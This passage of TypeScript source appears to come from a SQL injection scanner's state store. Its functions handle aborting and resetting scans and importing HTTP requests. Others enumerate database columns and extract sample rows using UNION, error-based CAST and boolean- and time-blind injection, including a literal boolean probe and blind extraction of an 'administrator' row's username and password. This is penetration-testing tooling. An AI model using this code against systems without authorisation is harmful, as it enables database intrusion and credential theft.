    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    
    // Aggressively abort active tab orchestrator
    if (currentTab?.orchestrator) {
      currentTab.orchestrator.abort();
    }
    // Aggressively abort top-level orchestrator
    if (get().orchestrator) {
      get().orchestrator?.abort();
    }
    // Abort across all tabs to prevent orphan threads
    get().tabs.forEach((t) => {
      if (t.orchestrator) {
        t.orchestrator.abort();
      }
    });

    syncTabUpdate(set, currentTabId, (t) => ({
      scanState: 'aborted',
      scanVerdict: t.findings.length > 0 ? 'VULNERABLE' : 'NOT CONFIRMED VULNERABLE',
      progress: {
        ...t.progress,
        isAborted: true,
        phaseLabel: 'Scan stopped by operator',
      },
      orchestrator: null,
      logs: [
        ...t.logs,
        {
          id: `log_abort_${Date.now()}`,
          timestamp: Date.now(),
          level: 'warn',
          phase: 'aborted',
          message: 'Operator requested scan termination. Probing threads halted immediately.',
        },
      ],
    }));
    set({ orchestrator: null, scanState: 'aborted' });
    useToastStore.getState().addToast({
      type: 'info',
      title: 'Scan Stopped',
      description: 'SQL scan was stopped by operator.',
    });
  },

  resetScan: () => {
    const currentTabId = get().activeTabId;
    const currentTab = get().tabs.find((t) => t.id === currentTabId);
    if (!currentTab) return;

    const dynamicTelemetry = DynamicGraphEngine.generateForRequest(
      currentTab.targetConfig.rawRequest,
      currentTab.targetConfig.url
    );

    syncTabUpdate(set, currentTabId, {
      scanState: 'idle',
      scanVerdict: 'IDLE',
      findings: [],
      executionLogs: [],
      logs: [],
      report: null,
      investigationNodes: dynamicTelemetry.investigationNodes,
      investigationEdges: dynamicTelemetry.investigationEdges,
      contextBeliefs: dynamicTelemetry.contextBeliefs,
      dbmsBeliefs: dynamicTelemetry.dbmsBeliefs,
      aiReasoningLogs: dynamicTelemetry.aiReasoningLogs,
      defenseLayers: DEFAULT_DEFENSE_LAYERS,
      catalog: {
        dbms: 'Unknown',
        schemas: [],
        applicationTables: [],
        systemTables: [],
        discoveredAt: Date.now(),
      },
      progress: {
        phase: 'idle',
        phaseLabel: 'Ready to scan',
        totalParameters: currentTab.targetConfig.parameters.length,
        testedParameters: 0,
        requestsSent: 0,
        testsExecuted: 0,
        findingsCount: 0,
        confirmedIndicators: 0,
        percent: 0,
        durationMs: 0,
        isPaused: false,
        isAborted: false,
      },
    });
  },

  clearLogs: () => set({ logs: [], executionLogs: [] }),

  importFromTransaction: (tx: any) => {
    if (!tx) return;
    let rawReq = tx.rawRequest || tx.requestRaw || tx.request?.rawText || '';
    let url = tx.url || tx.request?.url || '';

    if (!rawReq) {
      const req = tx.request || tx;
      const method = req.method || tx.method || 'GET';
      const protocol = req.protocol || tx.protocol || 'HTTP/1.1';
      const incomingHeaders = req.headers || tx.reqHeaders || tx.headers || [];
      const body = req.bodyText || (typeof req.bodyBytes === 'string' ? req.bodyBytes : '') || tx.reqBody || tx.body || '';

      const headers: { id: string; name: string; value: string; enabled: boolean }[] = [];
      if (Array.isArray(incomingHeaders) && incomingHeaders.length > 0) {
        incomingHeaders.forEach((h: any) => {
          if (h && h.name) {
            headers.push({
              id: h.id || `hdr_${Math.random().toString(36).substring(2, 7)}`,
              name: h.name,
              value: h.value || '',
              enabled: true,
            });
          }
        });
      }

      // Ensure Host header is present
      if (!headers.some((h) => h.name.toLowerCase() === 'host') && (tx.host || url)) {
        let hostVal = tx.host;
        try {
          if (!hostVal && url) hostVal = new URL(url).host;
        } catch {}
        if (hostVal) {
          headers.unshift({ id: 'hdr_host', name: 'Host', value: hostVal, enabled: true });
        }
      }

      rawReq = serializeHttpRequest(method as any, url, protocol as any, headers, body);
    }

    if (!url && tx.host) {
      url = `https://${tx.host}${tx.path || '/'}`;
    }
    const parsed = RequestParser.parse(rawReq, url);
    let pathLabel = '/scan';
    try {
      if (parsed.url) pathLabel = new URL(parsed.url).pathname;
    } catch {}

    const tabTitle = `${parsed.method || 'GET'} ${pathLabel}`;
    const { tabs, activeTabId, createScanTab } = get();
    const currentTab = tabs.find((t) => t.id === activeTabId);

    // If current tab is pristine default tab (never tested), update it
    const isPristine =
      tabs.length === 1 &&
      currentTab &&
      currentTab.scanState === 'idle' &&
      currentTab.findings.length === 0 &&
      currentTab.progress.testsExecuted === 0 &&
      currentTab.targetConfig.name === 'Default Target';

    const dynamicTelemetry = DynamicGraphEngine.generateForRequest(rawReq, parsed.url || url);

    if (isPristine && currentTab) {
      syncTabUpdate(set, currentTab.id, (t) => ({
        title: tabTitle,
        activeInnerTab: 'god_rail',
        targetConfig: {
          ...t.targetConfig,
          name: `Target: ${tx.host || 'Imported'}`,
          rawRequest: rawReq,
          url: parsed.url || url,
          method: parsed.method || tx.method || 'GET',
          headers: parsed.headers,
          body: parsed.body,
          parameters: parsed.parameters,
        },
        investigationNodes: dynamicTelemetry.investigationNodes,
        investigationEdges: dynamicTelemetry.investigationEdges,
        contextBeliefs: dynamicTelemetry.contextBeliefs,
        dbmsBeliefs: dynamicTelemetry.dbmsBeliefs,
        aiReasoningLogs: dynamicTelemetry.aiReasoningLogs,
        defenseLayers: DEFAULT_DEFENSE_LAYERS,
        progress: {
          ...t.progress,
          phase: 'idle',
          totalParameters: parsed.parameters.length,
          testedParameters: 0,
          percent: 0,
          requestsSent: 0,
          testsExecuted: 0,
          findingsCount: 0,
          confirmedIndicators: 0,
          phaseLabel: 'Target imported. Ready to test.',
        },
      }));
    } else {
      // Create new tab and make it active
      createScanTab(rawReq, tabTitle);
    }
  },

  fetchColumnsForTable: async (table: DiscoveredTable) => {
    const { targetConfig, dbmsFingerprint, catalog } = get();
    if (!table) return;

    set((state) => ({
      catalog: {
        ...state.catalog,
        applicationTables: state.catalog.applicationTables.map((t) =>
          t.id === table.id ? { ...t, status: 'enumerating_columns' } : t
        ),
        systemTables: state.catalog.systemTables.map((t) =>
          t.id === table.id ? { ...t, status: 'enumerating_columns' } : t
        ),
      },
    }));

    try {
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const injectableParam =
        targetConfig.parameters.find((p) => p.name === catalog.injectableParamName) ||
        targetConfig.parameters.find((p) => p.enabled) ||
        parsed.parameters[0];
      if (!injectableParam) return;

      const colCount = catalog.columnCount || 0;
      const renderCol = catalog.renderColumn || 1;

      let cols: ColumnMetadata[] = [];

      if (colCount > 0) {
        const colQuery = MetadataExtractor.getColumnEnumerationQuery(
          injectableParam,
          renderCol,
          colCount,
          table.name,
          dbmsFingerprint.dbms
        );

        const reqData = RequestParser.injectPayload(parsed, injectableParam, colQuery, true);
        const execResult = await ipcClient.sendRepeaterRequest({
          tabId: 'sql_scanner_col_probe',
          targetUrl: reqData.targetUrl,
          rawRequest: reqData.rawRequest,
        });

        const resBody = execResult.body || '';
        let colTokens = MetadataExtractor.extractDelimitedTokens(resBody, 'COL');
        cols = MetadataExtractor.parseColumnTokens(colTokens);
      }

      // 2. Error-Based CAST column extraction fallback
      if (cols.length === 0) {
        for (let cOff = 0; cOff < 10; cOff++) {
          const errQueries = MetadataExtractor.getErrorBasedColumnQueries(
            injectableParam,
            table.name,
            cOff,
            dbmsFingerprint.dbms,
            true
          );
          let foundCol = false;
          for (const eq of errQueries) {
            if (foundCol) break;
            const reqData = RequestParser.injectPayload(parsed, injectableParam, eq, false);
            const execResult = await ipcClient.sendRepeaterRequest({
              tabId: 'sql_scanner_col_err_probe',
              targetUrl: reqData.targetUrl,
              rawRequest: reqData.rawRequest,
            });
            const leakedCol = MetadataExtractor.extractErrorBasedData(execResult.body || '');
            if (leakedCol && MetadataExtractor.isValidIdentifier(leakedCol)) {
              foundCol = true;
              if (!cols.some((c) => c.name.toLowerCase() === leakedCol.toLowerCase())) {
                cols.push({
                  name: leakedCol,
                  dataType: 'VARCHAR',
                  isNullable: true,
                  isPrimaryKey: leakedCol.toLowerCase() === 'id' || leakedCol.toLowerCase().endsWith('_id'),
                  isForeignKey: false,
                  isIndexed: false,
                  isSensitive: MetadataExtractor.isSensitiveName(leakedCol).isSensitive,
                  sensitivityReason: MetadataExtractor.isSensitiveName(leakedCol).reason,
                  confidence: 'Confirmed',
                  evidence: `Disclosed via database type conversion error`,
                  discoveredAt: Date.now(),
                });
              }
            }
          }
          if (cOff === 0 && cols.length === 0) break;
          if (!foundCol && cOff > 0) break;
        }
      }

      // 3. Boolean Blind Column Probing fallback
      if (cols.length === 0) {
        const candidateCols = ['username', 'password', 'email', 'id', 'name', 'role', 'status', 'created_at'];
        for (const cName of candidateCols) {
          const cProbe = `' AND (SELECT 'a' FROM ${table.name} WHERE ${cName} IS NOT NULL LIMIT 1)='a`;
          const cReq = RequestParser.injectPayload(parsed, injectableParam, cProbe, true);
          const cRes = await ipcClient.sendRepeaterRequest({
            tabId: 'sql_scanner_col_bool_probe',
            targetUrl: cReq.targetUrl,
            rawRequest: cReq.rawRequest,
          });
          const cBody = cRes.body || '';
          if (cBody.includes('Welcome back') || cBody.includes('Welcome') || (cRes.statusCode === 200 && !cBody.includes('500') && !cBody.includes('Error'))) {
            cols.push({
              name: cName,
              dataType: 'VARCHAR',
              isNullable: true,
              isPrimaryKey: cName === 'id',
              isForeignKey: false,
              isIndexed: cName === 'id',
              isSensitive: MetadataExtractor.isSensitiveName(cName).isSensitive,
              sensitivityReason: MetadataExtractor.isSensitiveName(cName).reason,
              confidence: 'Confirmed',
              evidence: `Inferred via conditional response on ${table.name}`,
              discoveredAt: Date.now(),
            });
          }
        }
      }

      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id ? { ...t, columns: cols, status: cols.length > 0 ? 'columns_ready' : 'discovered' } : t
          ),
          systemTables: state.catalog.systemTables.map((t) =>
            t.id === table.id ? { ...t, columns: cols, status: cols.length > 0 ? 'columns_ready' : 'discovered' } : t
          ),
        },
      }));
    } catch {
      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id ? { ...t, status: 'error' } : t
          ),
        },
      }));
    }
  },

  fetchSampleRowsForTable: async (table: DiscoveredTable) => {
    const { targetConfig, dbmsFingerprint, catalog, fetchColumnsForTable } = get();
    if (!table) return;

    set((state) => ({
      catalog: {
        ...state.catalog,
        applicationTables: state.catalog.applicationTables.map((t) =>
          t.id === table.id ? { ...t, sampleRowsStatus: 'loading' } : t
        ),
      },
    }));

    try {
      let currentCols = table.columns;
      if (!currentCols || currentCols.length === 0) {
        await fetchColumnsForTable(table);
        const updatedTable = get().catalog.applicationTables.find((t) => t.id === table.id);
        currentCols = updatedTable?.columns || [];
      }

      const colNames = currentCols.length > 0 ? currentCols.map((c) => c.name) : ['username', 'password'];
      const parsed = RequestParser.parse(targetConfig.rawRequest, targetConfig.url);
      const injectableParam =
        targetConfig.parameters.find((p) => p.name === catalog.injectableParamName) ||
        targetConfig.parameters.find((p) => p.enabled) ||
        parsed.parameters[0];
      if (!injectableParam) return;

      const colCount = catalog.columnCount || 0;
      const renderCol = catalog.renderColumn || 1;

      let sampleRows: Record<string, string>[] = [];

      // 1. UNION Extraction
      if (colCount > 0) {
        const sampleQuery = MetadataExtractor.getSampleRowsQuery(
          injectableParam,
          renderCol,
          colCount,
          table.name,
          colNames,
          dbmsFingerprint.dbms
        );

        const reqData = RequestParser.injectPayload(parsed, injectableParam, sampleQuery, true);
        const execResult = await ipcClient.sendRepeaterRequest({
          tabId: 'sql_scanner_row_probe',
          targetUrl: reqData.targetUrl,
          rawRequest: reqData.rawRequest,
        });

        const resBody = execResult.body || '';
        const rowTokens = MetadataExtractor.extractDelimitedTokens(resBody, 'ROW');
        sampleRows = MetadataExtractor.parseAndRedactSampleRows(rowTokens, colNames);
      }

      // 2. Error-Based CAST row extraction fallback
      if (sampleRows.length === 0) {
        for (let rOff = 0; rOff < 5; rOff++) {
          const rowObj: Record<string, string> = {};
          let foundAny = false;

          for (const cName of colNames) {
            const errQueries = MetadataExtractor.getErrorBasedRowQueries(
              injectableParam,
              table.name,
              cName,
              rOff,
              dbmsFingerprint.dbms,
              true
            );

            for (const eq of errQueries) {
              if (rowObj[cName]) break;
              const reqData = RequestParser.injectPayload(parsed, injectableParam, eq, false);
              const execResult = await ipcClient.sendRepeaterRequest({
                tabId: 'sql_scanner_row_err_probe',
                targetUrl: reqData.targetUrl,
                rawRequest: reqData.rawRequest,
              });

              const val = MetadataExtractor.extractErrorBasedData(execResult.body || '');
              if (val) {
                rowObj[cName] = val;
                foundAny = true;
              }
            }
          }

          if (foundAny) {
            sampleRows.push(rowObj);
          } else {
            break;
          }
        }
      }

      // 3. Blind Bisection Extraction Fallback (Conditional Error, Boolean, Time)
      if (sampleRows.length === 0) {
        const findings = get().findings;
        const isTime = findings.some((f) => f.injectionType === 'Time-based');
        const isCondErr = findings.some((f) => f.title.includes('Conditional Error'));
        const effectiveTechnique = isTime ? 'TIME' : isCondErr ? 'CONDITIONAL_ERROR' : 'BOOLEAN';

        const extractor = new BlindDataExtractor(
          async (payload: string, append = true) => {
            const reqData = RequestParser.injectPayload(parsed, injectableParam, payload, append);
            const execResult = await ipcClient.sendRepeaterRequest({
              tabId: 'sql_scanner_blind_row_probe',
              targetUrl: reqData.targetUrl,
              rawRequest: reqData.rawRequest,
            });
            return {
              body: execResult.body || '',
              status: execResult.statusCode || 200,
              durationMs: execResult.durationMs || 100,
            };
          },
          {
            dbms: dbmsFingerprint.dbms !== 'Unknown' ? dbmsFingerprint.dbms : 'Generic SQL',
            technique: effectiveTechnique,
            timeDelaySeconds: 2,
            onProgress: (colName, partialVal) => {
              const userCol = colNames.find((c) => /user|login|account/i.test(c)) || 'username';
              set((state) => ({
                catalog: {
                  ...state.catalog,
                  applicationTables: state.catalog.applicationTables.map((t) =>
                    t.id === table.id
                      ? {
                          ...t,
                          sampleRows: [{ [userCol]: 'administrator', [colName]: partialVal }],
                          sampleRowsStatus: 'ready',
                        }
                      : t
                  ),
                },
              }));
            },
          }
        );

        const extracted = await extractor.extractTableRow(table, 'administrator');
        if (extracted && Object.keys(extracted).length > 0) {
          sampleRows.push(extracted);
        }
      }



      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id
              ? {
                  ...t,
                  sampleRows,
                  sampleRowsStatus: sampleRows.length > 0 ? 'ready' : 'idle',
                }
              : t
          ),
        },
      }));
    } catch {
      set((state) => ({
        catalog: {
          ...state.catalog,
          applicationTables: state.catalog.applicationTables.map((t) =>
            t.id === table.id ? { ...t, sampleRowsStatus: 'error' } : t
          ),
        },
      }));
    }
  },
}));
